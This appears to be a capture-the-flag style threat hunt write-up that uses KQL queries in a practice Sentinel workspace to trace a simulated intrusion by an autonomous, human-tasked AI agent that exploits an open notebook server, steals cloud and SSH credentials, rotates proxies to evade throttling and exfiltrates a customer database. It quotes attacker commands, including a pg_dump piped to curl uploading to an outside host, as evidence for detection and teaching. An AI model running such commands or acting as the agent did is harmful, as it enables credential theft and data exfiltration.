# Threat Hunt Report: Greenfield - TIDEGLASS

**Date:** September 2026  

## Platforms and Tools Used
- **Platform:** Microsoft Sentinel, Log Analytics Workspace (LAW-HuntPractice)
- **Languages & Tools:** Kusto Query Language (KQL), Claude AI

---

## Scenario Summary
Greenfield is a company with three main computers: one that runs a web-based coding tool, one that acts as a security gate into its private network, and one that stores its customer database.

On 14 August 2026, someone on the internet found that the coding tool had been left open with no password. They used a known flaw in it to get in.

The attacker was not a person typing commands. It was an AI program, given a single instruction by a human: find the most valuable customer data and get it out. After that, the AI worked entirely on its own.

Over the next 52 minutes, without stopping, it:

Took the server's own cloud login details, which cloud computers hand out automatically to anything running on them.
Used those details to search the company's password vault, switching between six different internet addresses to avoid being blocked when it went too fast.
Stole a key to the security gate from that vault.
Used the key to walk through the gate into the private network where the database lives.
Copied 2,841,902 customer records and sent them straight to a server the attacker controlled, without ever saving a copy on Greenfield's machines.

Every decision along the way — which computer to target, which key to steal, which data was most valuable — was made by the AI. The human's only involvement was writing that first sentence.

---

## 🔎 Flag Analysis & Findings

### 🏁 Section 1, Flag 1 – The Exploited Endpoint
- **Answer:** `GET /ws/kernel`
- **Discovery:** Web requests for the notebook host land in `ApacheAccess_CL`. The status code is what isolates the exploit: HTTP `101` is a protocol upgrade, not a page load, and only one request in the window returns it. That request is a `GET` to `/ws/kernel` — marimo's kernel WebSocket endpoint, the channel over which notebook code is submitted for execution. Everything else on the host in that window is ordinary `200` traffic.

**MITRE ATT&CK:** T1190 – Exploit Public-Facing Application
```kql
ApacheAccess_CL
| where Computer == "gf-tg-nb01"
| where HttpStatus == 101
| project TimeGenerated, HttpMethod, UriStem, ClientIP
| sort by TimeGenerated asc
```

<img width="1260" height="304" alt="Screenshot 2026-09-21 at 11 47 03" src="https://github.com/user-attachments/assets/b16ed858-566a-4aa2-a7b4-b6cb4fbd9931" />


---

### 🏁 Section 1, Flag 2 – The Named Weakness
- **Answer:** `CVE-2026-39987`
- **Discovery:** Because the intruder was an LLM agent, it narrated its own plan before acting. Searching `model_response` in `LLMAgentLogs_CL` for CVE references returns the agent naming `CVE-2026-39987` — the marimo kernel RCE — *before* it fires the exploit. That ordering is itself the finding: an attacker narrating its intended vulnerability into a log a defender can read is not something a human operator produces. The claim was corroborated against the web log rather than accepted at face value: the CVE targets the kernel endpoint, and `/ws/kernel` is the path that returned 101.

**MITRE ATT&CK:** T1190 – Exploit Public-Facing Application
```kql
LLMAgentLogs_CL
| where session_id == "tg-4b81e0d7" and model_response has "CVE"
| project TimeGenerated, model_response
```

<img width="1275" height="138" alt="Screenshot 2026-09-21 at 11 48 53" src="https://github.com/user-attachments/assets/86430026-4303-47b9-b32a-b4ab1251c8e5" />


---

### 🏁 Section 1, Flag 3 – The Staging Address
- **Answer:** `198.51.100.23`
- **Discovery:** The same request line that identified the endpoint carries the source. `ClientIP` on the 101 upgrade resolves to `198.51.100.23` — the attacker's staging infrastructure.

  This address is one of three distinct address sets in this incident, and conflating them is the common error. `198.51.100.23` delivered the exploit. A six-address Cloudflare Workers pool on `203.0.113.0/24` carried the AWS API calls. `203.0.113.41` received the stolen data. Three roles, three sets, no overlap.

```kql
ApacheAccess_CL
| where Computer == "gf-tg-nb01" and UriStem == "/ws/kernel"
| project TimeGenerated, HttpMethod, UriStem, ClientIP, HttpStatus
```

<img width="1263" height="319" alt="Screenshot 2026-09-21 at 11 55 26" src="https://github.com/user-attachments/assets/da8cf1a2-039c-4e52-8296-8698864b0bf7" />


---

### 🏁 Section 1, Flag 4 – The Spawned Interpreter
- **Answer:** `python3.12`, PID `5211`, parent `/opt/venv/bin/marimo edit --host 0.0.0.0 --port 2718 --no-token`
- **Discovery:** `LinuxProcess_CL` uses `Dvc` rather than `Computer` for the host field — worth noting, as the obvious column name returns nothing here. Scoping to `gf-tg-nb01` shows `python3.12` starting 74 times in the window, so the binary name discriminates nothing. Only one instance is parented by the marimo launch line; the other 73 are developer one-liners parented to `bash` and one systemd-parented baseline.

  The parent command line is also the root cause, stated in plain text. `--host 0.0.0.0` exposed the notebook server on every interface, and `--no-token` disabled authentication entirely. That is why an unauthenticated WebSocket upgrade succeeded at all.

**MITRE ATT&CK:** T1059.006 – Command and Scripting Interpreter: Python
```kql
LinuxProcess_CL
| where Dvc == "gf-tg-nb01" and TargetProcessName == "python3.12"
| project TimeGenerated, TargetProcessId, TargetProcessCommandLine, ActingProcessCommandLine
| sort by TimeGenerated asc
```

<img width="1260" height="322" alt="Screenshot 2026-09-21 at 11 57 13" src="https://github.com/user-attachments/assets/9a90b3cb-6a2d-46d8-9024-00aa96cfc47b" />


---

### 🏁 Section 2, Flag 1 – The Stolen Identity
- **Answer:** `arn:aws:iam::402913776148:user/svc-notebook`
- **Discovery:** Within three minutes of landing, the interpreter went looking for cloud credentials. The agent's reasoning records the decision and the result in two consecutive entries: the environment held an AWS access key ID but no secret key, so it went to the instance metadata service, which hands out full role credentials without one. The identity it walked away with is the EC2 instance's own service account.

  Instance credential theft over the metadata service turns a service account's own role into the intruder's cloud identity. Every AWS API call in the sections that follow is made as `svc-notebook`, which is why the activity looks like the server doing its job rather than an obvious intrusion.

**MITRE ATT&CK:** T1552.005 – Unsecured Credentials: Cloud Instance Metadata API
```kql
LLMAgentLogs_CL
| where session_id == "tg-4b81e0d7" and model_response has "arn:aws:iam"
| project TimeGenerated, model_response
```

<img width="1273" height="129" alt="Screenshot 2026-09-21 at 11 59 14" src="https://github.com/user-attachments/assets/434877c6-544a-408f-a66f-08232a91ef21" />


---

### 🏁 Section 2, Flag 2 – Which PID Actually Reached the Metadata Service
- **Answer:** The assumption does not hold. The network log records PID `5211`.
- **Discovery:** Shell history shows `curl` fetching `169.254.169.254`, and the natural reading is that the curl child process — PID `5213` — opened that connection. The network telemetry says otherwise. The single connection to the metadata service at 11:08:12 is attributed to `ActingProcessId 5211`, the parent `python3.12` interpreter. `5213` appears nowhere in `LinuxNetwork_CL`.

  Neither log is wrong; they are different sensors answering different questions. Shell history records commands issued. Network telemetry attributes sockets to the process it observes owning them, and a short-lived child spawned by the interpreter can be credited to the parent.

  The practical risk is what makes this worth recording. Pivoting on `5213` returns zero rows, and zero rows reads as *nothing happened* rather than *wrong pivot value*. A pivot field must be confirmed in the destination table, not carried across from the source.

```kql
LinuxNetwork_CL
| where Dvc == "gf-tg-nb01"
| where DstIpAddr == "169.254.169.254"
| project TimeGenerated, ActingProcessId, ActingProcessName, DstIpAddr, DstPortNumber
| sort by TimeGenerated asc
```

<img width="1262" height="294" alt="Screenshot 2026-09-21 at 12 01 03" src="https://github.com/user-attachments/assets/aace6545-de05-4cf7-b68f-2fbc83911f0d" />


---

### 🏁 Section 2, Flag 3 – ATLAS Mapping
- **Answer:** `AML.T0098`, maturity **Realized**
- **Discovery:** A framework question rather than a query. MITRE ATLAS classifies AI-specific techniques, and `AML.T0098` — AI Agent Tool Credential Harvesting — covers an adversary using their access to an AI agent to retrieve credentials through the agent's own available tooling. Its maturity is **Realized**, meaning a threat actor has used the technique in a confirmed real-world incident rather than a research setting.

  The dual framing is the point. ATT&CK `T1552.005` describes the conventional consequence — credentials taken from the cloud metadata API. ATLAS `AML.T0098` describes the AI-layer cause — an agent's own tools being turned to the task. Same event, two vocabularies, and an incident report covering agentic activity needs both.

**MITRE ATT&CK:** T1552.005 – Cloud Instance Metadata API
**MITRE ATLAS:** AML.T0098 – AI Agent Tool Credential Harvesting (Realized)

---

### 🏁 Section 3, Flag 1 – The Identity Behind Every Call
- **Answer:** `AKIA4TIDEGLASS0EXAMPLE`
- **Discovery:** Every Secrets Manager call in the window carries the same access key. The source address rotates across six pool addresses; the credential does not move. Pivoting on the address alone scatters this activity into six unrelated sightings of one or two calls each — apparently trivial, individually ignorable. Pivoting on the key collapses them into one operation.

  This is the Pyramid of Pain made concrete. The egress addresses are cheap and were rotated in seconds. The access key is the thing the attacker actually needed to keep, and it is the thing they never changed.

**MITRE ATT&CK:** T1526 – Cloud Service Discovery
```kql
AWSCloudTrail
| where EventSource == "secretsmanager.amazonaws.com"
| summarize Calls = count(), Addresses = dcount(SourceIpAddress)
    by UserIdentityAccessKeyId, UserIdentityArn
```

<img width="1275" height="140" alt="Screenshot 2026-09-21 at 12 03 24" src="https://github.com/user-attachments/assets/fe17153d-ceb0-4ef6-b2a4-9525d80544ac" />


---

### 🏁 Section 3, Flag 2 – The Throttle, and the Report's Gap
- **Answer:** `11:22:41` → `11:23:05`, `203.0.113.71` → `203.0.113.94`
- **Discovery:** The public analysis states the gap between the throttled call and the successful retry. Both ends were proved locally instead. A `ListSecrets` call at `11:22:41` from `203.0.113.71` returned `ThrottlingException`; the next successful `ListSecrets` landed at `11:23:05`, twenty-four seconds later, from `203.0.113.94`.

  The twenty-four seconds is what a report carries. The address change either side of it is what a report typically does not, and it is the more important half: it turns *the agent waited out a rate limit* into *the agent rotated infrastructure to evade one*. Recovering that detail requires projecting `SourceIpAddress` alongside the timestamps, and the agent's own narration at 11:22:44 confirms the intent — it describes spreading the remaining enumeration across its Cloudflare Workers pool so no single address is throttled.

```kql
AWSCloudTrail
| where EventSource == "secretsmanager.amazonaws.com" and EventName == "ListSecrets"
| where UserIdentityAccessKeyId == "AKIA4TIDEGLASS0EXAMPLE"
| project TimeGenerated, SourceIpAddress, ErrorCode
| sort by TimeGenerated asc
```

<img width="1274" height="164" alt="Screenshot 2026-09-21 at 12 05 21" src="https://github.com/user-attachments/assets/554f28ad-9ab2-4d52-9cbe-ad16cdc4bb8e" />


---

### 🏁 Section 3, Flag 3 – How Many Addresses, and Which Ones
- **Answer:** `6` — `203.0.113.71`, `203.0.113.94`, `203.0.113.118`, `203.0.113.142`, `203.0.113.167`, `203.0.113.203`
- **Discovery:** Scoping to the `svc-notebook` access key and summarising by first-seen order returns six distinct egress addresses. Scoping is what makes the count correct: a benign CI identity calls Secrets Manager 212 times from a single stable address in the same window, and dropping the key filter pulls it into the result set.

  The shape of the timestamps is as informative as the count:

  | First seen | Address | Calls |
  |------------|---------|-------|
  | 11:11:19 | 203.0.113.71 | 2 |
  | 11:23:05 | 203.0.113.94 | 1 |
  | 11:23:06 | 203.0.113.118 | 1 |
  | 11:23:09 | 203.0.113.142 | 2 |
  | 11:23:13 | 203.0.113.167 | 1 |
  | 11:23:15 | 203.0.113.203 | 1 |

  `203.0.113.71` worked alone and unhurried for eleven minutes. After the throttle, five further addresses entered service in eleven seconds. The behaviour changes sharply the moment AWS pushes back — a person swaps proxy once and continues; this cycled the whole pool programmatically.

```kql
AWSCloudTrail
| where EventSource == "secretsmanager.amazonaws.com"
| where UserIdentityAccessKeyId == "AKIA4TIDEGLASS0EXAMPLE"
| summarize FirstSeen = min(TimeGenerated), Calls = count() by SourceIpAddress
| sort by FirstSeen asc
```

<img width="1274" height="247" alt="Screenshot 2026-09-21 at 12 06 23" src="https://github.com/user-attachments/assets/a20d9a8d-053b-4496-a286-79486168e92f" />


---

### 🏁 Section 3, Flag 4 – ATT&CK Pick
- **Answer:** `T1090.003`
- **Discovery:** Routing one stolen credential across several disposable egress addresses to dodge throttling and blocking is Proxy: Multi-hop Proxy. Traffic passes through intermediate infrastructure the adversary controls, so no single address can be blocked to stop the activity — block `203.0.113.71` after the throttle and the work completes from `.94`, then `.118`, then `.142`.

  It worked at the network layer and failed at the identity layer. Six addresses, one access key. The rotation bought nothing once the pivot moved from address to credential.

**MITRE ATT&CK:** T1090.003 – Proxy: Multi-hop Proxy

---

### 🏁 Section 4, Flag 1 – The Secret and When It Was Taken
- **Answer:** `prod/bastion/ssh-deploy-key`, retrieved at `11:31:16`
- **Discovery:** Six of the seven Secrets Manager calls in this session are `ListSecrets` and `DescribeSecret` — enumeration. One is `GetSecretValue`, and that is the theft. The agent's reasoning names the target explicitly and draws the same distinction unprompted: it identifies `prod/bastion/ssh-deploy-key` as the way into the data subnet and states that everything so far has been read-only enumeration and this is the call that takes something.
  Note the follow-on three minutes later. The retrieved secret was not a database password but an SSH private key, written to disk and used to reach the bastion. A secret is not just a log entry; it becomes an artefact with a life of its own.
  Establishing this took two tables. CloudTrail confirms a `GetSecretValue` by `svc-notebook` at 11:31:16 from `203.0.113.142`, but its `RequestParameters` field is empty in this dataset, so it does not name the secret. The agent's own reasoning in `LLMAgentLogs_CL` does. Each table carries half the fact.
  
**MITRE ATT&CK:** T1555.006 – Credentials from Password Stores: Cloud Secrets Management Stores
```kql
AWSCloudTrail
| where EventName == "GetSecretValue" and UserIdentityArn has "svc-notebook"
| project TimeGenerated, EventName, ReadOnly, SourceIpAddress
```
 
<img width="1276" height="112" alt="Screenshot 2026-09-21 at 12 11 09" src="https://github.com/user-attachments/assets/e1dce3af-cf6b-40c3-87a9-cdbfa87428f0" />

```kql
LLMAgentLogs_CL
| where session_id == "tg-4b81e0d7" and model_response has "ssh-deploy-key"
| project TimeGenerated, model_response
```
 
<img width="1274" height="144" alt="Screenshot 2026-09-21 at 12 11 54" src="https://github.com/user-attachments/assets/5567c23d-1cd0-47c3-b29b-6f87f34da8f9" />


---

### 🏁 Section 4, Flag 2 – Recon Versus Theft
- **Answer:** `ReadOnly = false`
- **Discovery:** CloudTrail tags every management event with a read/write indicator, and that single boolean separates looking from taking. All six enumeration calls carry `ReadOnly: true`. The `GetSecretValue` at 11:31:16 is the only row in the session where it flips to `false`.

  Its value as a detection signal is that it needs no prior knowledge. No secret names, no API name allowlist, no request parameter parsing. A rule that alerts on `ReadOnly == false` against `secretsmanager.amazonaws.com` catches the theft and discards every enumeration call — including the benign CI identity's 212.

  It is also the field that survived when others did not. `RequestParameters` and `ResponseElements` are both empty on that row in this dataset; `ReadOnly` was populated on all seven.

```kql
AWSCloudTrail
| where EventSource == "secretsmanager.amazonaws.com"
| where UserIdentityArn has "svc-notebook"
| summarize Calls = count(), Events = make_set(EventName) by ReadOnly
```

<img width="1269" height="134" alt="Screenshot 2026-09-21 at 12 14 44" src="https://github.com/user-attachments/assets/27228c57-b44d-4960-a35e-140e13952674" />


---

### 🏁 Section 4, Flag 3 – What the Cloud Log Cannot Tell You
- **Answer:** The key material **cannot** be recovered. The log records a `VersionId` and nothing more.
- **Discovery:** AWS deliberately keeps secret values out of CloudTrail. `ResponseElements` on a `GetSecretValue` call carries only the version identifier of the secret returned — never its contents. If the audit trail recorded secret values, the trail would itself become a credential store, and read access to CloudTrail would confer access to every secret ever fetched.

  Dumping the full theft row with `pack_all()` confirms it directly: `RequestParameters` and `ResponseElements` are both empty strings on that record.

  What CloudTrail proves is that `prod/bastion/ssh-deploy-key` was read at 11:31:16 by `svc-notebook` from `203.0.113.142`. That the secret was an SSH deploy key for the `deploy` account with no passphrase is known only from the agent's own narration, and that it worked is known only from the bastion auth log.

  The remediation consequence follows directly. Because the value cannot be recovered or verified from the log, the key must be treated as fully compromised and rotated. *We cannot tell what was taken* means *assume all of it*.

```kql
AWSCloudTrail
| where EventName == "GetSecretValue" and UserIdentityArn has "svc-notebook"
| extend AllColumns = tostring(pack_all())
| project TimeGenerated, AllColumns
```

<img width="1259" height="313" alt="Screenshot 2026-09-21 at 12 18 20" src="https://github.com/user-attachments/assets/ab45fe78-657d-4a6f-99b1-c9665fa6679c" />


---

### 🏁 Section 5, Flag 1 – The Key, Traced to the Login
- **Answer:** `/tmp/.c/id_ed25519`, account `deploy`, host `gf-tg-bastion01`
- **Discovery:** Three artefacts, one chain: the API call that read the secret, the file it became on disk, and the login it enabled. Shell history shows the key written to `/tmp/.c/id_ed25519` with mode `600` at 11:31:20 — four seconds after the `GetSecretValue`. The directory is dot-prefixed, hidden from a plain `ls`, which is a deliberate concealment choice rather than an accident of path. At 11:34:31 it is used to SSH into `gf-tg-bastion01` (`10.6.0.20`) as `deploy`.

  That hop is what made the rest possible. The notebook host cannot reach the database subnet. The bastion can, and the agent's own narration says exactly that.

**MITRE ATT&CK:** T1021.004 – Remote Services: SSH
```kql
LinuxShellHistory_CL
| where Command has "chmod" and Command has "id_ed25519"
| project TimeGenerated, Computer, ShellUser, Command
```

<img width="1276" height="114" alt="Screenshot 2026-09-21 at 12 19 16" src="https://github.com/user-attachments/assets/17b0afba-8a75-4faf-862a-74c0a9e1b92a" />


---

### 🏁 Section 5, Flag 2 – What Actually Marks This Login Out
- **Answer:** `TargetUsername = deploy`
- **Discovery:** The bastion records 319 successful logins in scope. 318 belong to four named human administrators, and every one of them authenticates by `publickey` — the same method the intruder used. The authentication method is therefore shared and separates nothing. Neither does the time of day, nor the result, nor the source subnet.

  What separates the intrusion is the account. A deploy key exists for automation — CI pipelines, configuration runs — not interactive sessions. Human administrators log in as themselves. One `deploy` SSH session among four named admins is anomalous by identity alone, before anything about the key, the timing, or the commands is examined.

**MITRE ATT&CK:** T1078.004 – Valid Accounts: Cloud Accounts
```kql
LinuxAuth_CL
| where Dvc == "gf-tg-bastion01" and EventResult == "Success"
| summarize Logins = count() by TargetUsername
| sort by Logins desc
```

<img width="1274" height="217" alt="Screenshot 2026-09-21 at 12 20 02" src="https://github.com/user-attachments/assets/41cd408d-c8d5-47a2-95af-37d143a24bde" />


---

### 🏁 Section 5, Flag 3 – Key Fingerprint
- **Answer:** `ED25519 SHA256:mNq7xR2vTbY8kLpJ4wZaHc1oUeVgX5tDsFj0rWnAE`
- **Discovery:** sshd records a fingerprint for every key-based authentication, and it sits in the raw message rather than a structured field. The `Accepted publickey` line for the `deploy` session carries the key type and its SHA256 fingerprint in `EventOriginalMessage`.

  The fingerprint is the shareable indicator. The key material itself could not be recovered from CloudTrail — Section 4, Flag 3 — but the fingerprint identifies the specific key across every host in the estate, tells the team performing rotation exactly which key to revoke, and can be published in an incident report without disclosing a credential. The account name told us something was wrong; the fingerprint tells us what to remove.

**MITRE ATT&CK:** T1021.004 – Remote Services: SSH
```kql
LinuxAuth_CL
| where Dvc == "gf-tg-bastion01" and TargetUsername == "deploy"
| project TimeGenerated, EventResult, EventOriginalMessage
```

<img width="1274" height="125" alt="Screenshot 2026-09-21 at 12 21 00" src="https://github.com/user-attachments/assets/1478fdc0-be79-48a1-99cc-2d9e41cfc5dc" />


---

### 🏁 Section 6, Flag 1 – Recon Command and Target
- **Answer:** `psql`, database `customers`
- **Discovery:** From the bastion the agent went straight at the database. At 11:37:40 it ran:

  `psql -h 10.6.0.30 -U app -c '\dt+' | sort -k7 -h | tail -5`

  The command reveals the objective as clearly as the result does. `\dt+` lists tables *with sizes*, `sort -k7 -h` orders by the size column, `tail -5` takes the five largest. This is not *what is in here* — it is *where is the most data*. Two seconds later the agent's reasoning settles on `customers`.

  Finding it required reading past the noise: the `deploy` account runs `ansible-playbook` and `git pull` continuously through the working day, and two commands out of roughly thirty are the intrusion.

**MITRE ATT&CK:** T1046 – Network Service Discovery
```kql
LinuxShellHistory_CL
| where Computer == "gf-tg-bastion01" and ShellUser == "deploy"
| project TimeGenerated, Command
| sort by TimeGenerated asc
```

<img width="1261" height="320" alt="Screenshot 2026-09-21 at 12 22 07" src="https://github.com/user-attachments/assets/c1871e61-5f0a-4e18-b5c7-542c1eb9884b" />


---

### 🏁 Section 6, Flag 2 – Row Count Established Before the Dump
- **Answer:** `2841902`
- **Discovery:** The agent's reasoning at 11:37:42 records the `customers` database as the largest object in the instance at 2,841,902 rows and names it as the customer dataset. The figure comes from the `\dt+` enumeration three minutes *before* `pg_dump` ran, which is what the flag turns on: the scale of the prize was known before it was taken, and the row count is the agent's own justification for choosing that table.

  For the incident report, this converts *a database was touched* into *2.8 million rows were targeted* — the difference between an unscoped incident and a quantified one.

**MITRE ATT&CK:** T1213 – Data from Information Repositories
```kql
LLMAgentLogs_CL
| where session_id == "tg-4b81e0d7" and model_response has "rows"
| project TimeGenerated, model_response
```

<img width="1269" height="194" alt="Screenshot 2026-09-21 at 12 24 11" src="https://github.com/user-attachments/assets/45a4c429-839e-4939-8d34-54fbf9acc149" />


---

### 🏁 Section 6, Flag 3 – Tool and Destination
- **Answer:** `pg_dump` → `203.0.113.41:8443`
- **Discovery:** At 11:40:49, three minutes after the enumeration:

  `pg_dump -h 10.6.0.30 -U app -Fc customers | gzip | curl -s -T - https://203.0.113.41:8443/u`

  The whole operation is one pipeline. `pg_dump -Fc` exports in compressed custom format, `gzip` compresses again, and `curl -T -` uploads from standard input. The `-` is the important character: curl reads from the pipe, so **the dump never touches disk**. No staging file, no temporary directory, no artefact left on the bastion to find.

  `203.0.113.41` is the exfil destination and the third distinct address role in this incident — not the staging address from Section 1, not a member of the Workers pool from Section 3.

**MITRE ATT&CK:** T1005 – Data from Local System
```kql
LinuxShellHistory_CL
| where ShellUser == "deploy" and Command has "pg_dump"
| project TimeGenerated, Computer, Command
```

<img width="1275" height="111" alt="Screenshot 2026-09-21 at 12 24 52" src="https://github.com/user-attachments/assets/48818b68-1c40-4aa9-9dac-12c47e7012fb" />


---

### 🏁 Section 6, Flag 4 – Prove It From the Database's Own Log
- **Answer:** `database = customers`
- **Discovery:** Because the dump never hit disk, there is no file artefact and no residual process to examine. The proof has to come from the target rather than the attacker's host. PostgreSQL logs its own connections, and the `connection authorized` lines in `Syslog` on `gf-tg-pg01` carry a `database=` field.

  Across the whole log this host records `database=greenfield_platform` and nothing else — a single uniform value for routine application traffic. One entry names `customers`. That single row proves the target database from telemetry the attacker never controlled.

  The distinction matters evidentially. A process command line on the bastion shows what was *attempted* and can be deleted, forged, or simply lost when the process exits. The database's own connection log shows what was *accessed*.

**MITRE ATT&CK:** T1005 – Data from Local System
```kql
Syslog
| where Computer == "gf-tg-pg01" and SyslogMessage has "connection authorized"
| extend Database = extract(@"database=(\w+)", 1, SyslogMessage)
| summarize Connections = count() by Database
| sort by Connections desc
```

<img width="1272" height="137" alt="Screenshot 2026-09-21 at 12 26 05" src="https://github.com/user-attachments/assets/458d16ef-7f98-4c70-a92e-f6bbf4f9b392" />


---

### 🏁 Section 6, Flag 5 – Not the Nightly Backup
- **Answer:** account `deploy`, destination `203.0.113.41`
- **Discovery:** A scheduled internal backup uses the same tool on the same estate, so `pg_dump` by itself proves nothing — alerting on the binary would page an analyst every night and bury this dump in its own noise. Two properties disprove the backup theory:

  | | Nightly backup | The theft |
  |---|---|---|
  | **Account** | `pgbackup` | `deploy` |
  | **Destination** | stays on `10.6.0.0/24` | `203.0.113.41` |

  Wrong account, wrong destination. The backup job never leaves the subnet.

  This is the same lesson as the CI identity in Section 3 and the 318 admin logins in Section 5, arriving for the third time: the suspicious thing is rarely the tool. It is the account that invoked it and where the output went.

**MITRE ATT&CK:** T1005 – Data from Local System
```kql
LinuxShellHistory_CL
| where Command has "pg_dump"
| project TimeGenerated, Computer, ShellUser, Command
| sort by TimeGenerated asc
```

<img width="1260" height="317" alt="Screenshot 2026-09-21 at 12 27 54" src="https://github.com/user-attachments/assets/bd173bb8-5c21-470d-b837-fb3d6d345e10" />


---

### 🏁 Section 7, Flag 1 – Session and Tasking
- **Answer:** `tg-4b81e0d7` — *"Find and extract the most valuable customer dataset in this environment, and get it out."*
- **Discovery:** The agent log holds more than one conversation. The estate runs its own notebook assistant, `greenfield-notebook-assistant`, across three rotating sessions doing routine work. Summarising by `actor` and `session_id` isolates the outlier: `tg-4b81e0d7`, a single session that does not match the house naming pattern.

  Its `user_input` — the human-authored instruction that opened the session — is one sentence. Read what it does not contain: no host, no database, no table, no credential, no method. A human supplied a goal. The agent determined which server to exploit, which credential to steal, which of two enumerated secrets was worth taking, which table satisfied "most valuable," and how to move the data out.

**MITRE ATT&CK:** T1059.006 – Command and Scripting Interpreter: Python
```kql
LLMAgentLogs_CL
| where session_id == "tg-4b81e0d7"
| where isnotempty(user_input)
| project TimeGenerated, actor, session_id, user_input
| sort by TimeGenerated asc
```

<img width="1275" height="133" alt="Screenshot 2026-09-21 at 12 31 58" src="https://github.com/user-attachments/assets/011354fe-97e5-4804-851f-fa0ed29f533b" />

---

### 🏁 Section 7, Flag 2 – The Autonomy Verdict
- **Answer:** `human-tasked`
- **Discovery:** A person wrote one instruction; a machine executed everything after it. Two artefacts carry the finding:

  **`LLMAgentLogs_CL` / `user_input`** — session `tg-4b81e0d7` contains exactly one human-authored line, the objective, and nothing after it. No further steering, no check-ins, no course corrections from a human hand anywhere in fifty-two minutes.

  **`LLMAgentLogs_CL` / `model_response`** — the agent reasons its way through every decision and adapts without prompting. It reads the environment, concludes the metadata service will supply what the environment lacks, and acts on it. It detects rate limiting and redistributes across its egress pool unprompted. It weighs two enumerated secrets and selects the one that reaches the data subnet. Those are decisions, not scripted branches.

  Supporting evidence is temporal: a continuous fifty-two-minute chain with no human-scale pauses at any phase boundary.

  The distinction is operationally load-bearing. *Human-driven* would mean an operator to identify. *Fully autonomous* would mean no human intent to attribute. *Human-tasked* means someone wrote an objective and walked away — the attribution target is whoever authored that sentence, not whoever was at a keyboard, because nobody was.

```kql
LLMAgentLogs_CL
| where session_id == "tg-4b81e0d7"
| project TimeGenerated, user_input, tool_name, tool_result, model_response
| sort by TimeGenerated asc
```

<img width="1260" height="317" alt="Screenshot 2026-09-21 at 12 35 12" src="https://github.com/user-attachments/assets/41c1e193-f464-4b1f-bd3d-5b69e09b528c" />


---

### 🏁 Section 8, Flag 1 – Real or Noise: the python3.12 Spawns
- **Answer:** `ActingProcessCommandLine` = `/opt/venv/bin/marimo edit --host 0.0.0.0 --port 2718 --no-token`
- **Discovery:** 74 `python3.12` processes started on `gf-tg-nb01` in this window: 72 developer one-liners parented to `bash`, one systemd-parented baseline, and the attacker's interpreter. The binary name is identical across all of them, the user is the same, and the timing overlaps with ordinary work. Nothing about the process itself is unusual.

  Grouping by parent command line splits them cleanly into three, and the attacker's is the only one parented by the marimo launch line. A web application spawning an interpreter is the lineage that separates exploit-driven execution from a developer at a shell.

  Lineage also survives payload changes. The attacker can swap Python for any other interpreter, but if the entry point is still a notebook kernel endpoint, the parent remains marimo. The binary name is a commodity indicator; the parent is behavioural.

```kql
LinuxProcess_CL
| where Dvc == "gf-tg-nb01" and TargetProcessName == "python3.12"
| summarize Count = count() by ActingProcessCommandLine
| sort by Count desc
```

<img width="1275" height="157" alt="Screenshot 2026-09-21 at 12 36 05" src="https://github.com/user-attachments/assets/dddf744b-21cd-46ec-8682-975632dbf155" />


---

### 🏁 Section 8, Flag 2 – Real or Noise: the Metadata-Service Reads
- **Answer:** `ActingProcessName` = `python3.12`
- **Discovery:** 86 connections reached `169.254.169.254` in this window. 85 came from a credential-helper daemon named `refresh`, polling routinely to keep instance credentials current. One came from `python3.12`.

  The destination address is worthless as a discriminator here. Every instance on this estate talks to the metadata service; that is how cloud servers obtain credentials at all. An alert on the address produces 85 false positives for one true hit, and an analyst who sees it 85 times stops reading it.

  The anomaly is that a *notebook interpreter* requested instance credentials. The credential helper has a standing reason to be there. Code submitted through a notebook kernel does not.

```kql
LinuxNetwork_CL
| where DstIpAddr == "169.254.169.254"
| summarize Connections = count() by ActingProcessName
| sort by Connections desc
```

<img width="1269" height="145" alt="Screenshot 2026-09-21 at 12 36 51" src="https://github.com/user-attachments/assets/c18d5157-65f0-4702-9960-04df910528df" />


---

### 🏁 Section 8, Flag 3 – Real or Noise: the Secret Reads
- **Answer:** source network and target secret — `SourceIpAddress` = `203.0.113.142` (the rotating pool) and SecretId = `prod/bastion/ssh-deploy-key`. Equivalently, `UserIdentityArn` = `arn:aws:iam::402913776148:user/svc-notebook`, which is the identity behind that address.
- **Discovery:** 22 successful `GetSecretValue` calls appear in this window and all 22 share the same shape — read-write, successful — so `ReadOnly=false` cannot separate them here even though it isolated the theft within the attacker's own session in Section 4.

  A useful negative result: `UserAgent` is `python-httpx/0.27.0` on **every one of the 22**, legitimate and hostile alike. The estate's own notebook application uses the same HTTP client, so the user agent is not the automation tell it initially appeared to be. An indicator that looks damning in isolation can be baseline once the baseline is actually pulled.

  Multi-dimensional discrimination is what works. The 21 routine calls all originate from a single internal CI address, `10.6.0.12`, under `assumed-role/app-role/notebook-app` — short-lived STS credentials the application obtains automatically — and they target operational secrets. The theft came from `203.0.113.142`, a member of the rotating Workers pool, under the long-lived IAM user `svc-notebook` lifted from the metadata service, and it targeted a bastion SSH deploy key.

  Either the source network or the credential type identifies the caller, and the secret identifies the objective. Neither alone is conclusive; together they are. No web application has reason to fetch a lateral-movement credential.

```kql
AWSCloudTrail
| where EventName == "GetSecretValue" and ReadOnly == false
| project TimeGenerated, UserIdentityArn, UserAgent, SourceIpAddress,
          Params = tostring(RequestParameters)
| sort by TimeGenerated asc
```

<img width="1264" height="319" alt="Screenshot 2026-09-21 at 12 38 00" src="https://github.com/user-attachments/assets/5806ef74-d070-4061-b00c-47acf131c281" />


---

### 🏁 Section 8, Flag 4 – Real or Noise: the Pace of the Whole Chain
- **Answer:** Continuous — roughly **52 minutes**, start to finish.
- **Discovery:** The estate's routine activity is scattered across the working day, as human and scheduled work is. The `deploy` account's legitimate commands on the bastion run from 03:26 to 13:52 in bursts, with gaps of twenty minutes, an hour, and nothing overnight. People start things, walk away, and return.

  The attacker's chain has no such gaps. From the WebSocket connect at 11:05:02 to transfer complete at 11:57:00 it runs unbroken through six phases — exploitation, credential theft, evasion, collection, lateral movement, exfiltration — with no idle period at any boundary. Nobody pauses to read output, decide, look something up, or get a coffee.

  Temporal density is itself the indicator, and it is the strongest single support for the human-tasked verdict: one instruction at the start, then fifty-two uninterrupted minutes with no human in the loop.

```kql
LLMAgentLogs_CL
| where session_id == "tg-4b81e0d7"
| summarize FirstEvent = min(TimeGenerated), LastEvent = max(TimeGenerated)
| extend Span = LastEvent - FirstEvent
```

<img width="1276" height="119" alt="Screenshot 2026-09-21 at 12 38 48" src="https://github.com/user-attachments/assets/404c559d-dc8b-44f4-a3c0-099e6f1e93cb" />


---

## 🧠 Summary Table
| Section | Flag | Description | Value |
|---------|------|-------------|-------|
